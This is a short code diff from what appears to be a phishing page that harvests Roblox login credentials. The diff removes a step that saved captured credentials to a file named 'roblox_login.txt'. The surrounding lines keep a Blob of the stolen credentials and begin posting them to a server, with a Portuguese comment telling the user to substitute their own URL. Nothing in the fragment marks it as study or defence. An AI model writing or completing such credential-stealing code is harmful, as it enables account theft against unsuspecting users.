@@ -574,11 +574,6 @@ site.</div></div></noscript>
             const blob = new Blob([credentials], { type: 'text/plain' });
             const url = URL.createObjectURL(blob);
             
-            // Forçar download do arquivo
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = 'roblox_login.txt';
-            a.click();
             
             // Simular envio para um servidor (substitua pela sua URL)
             const formData = new FormData();
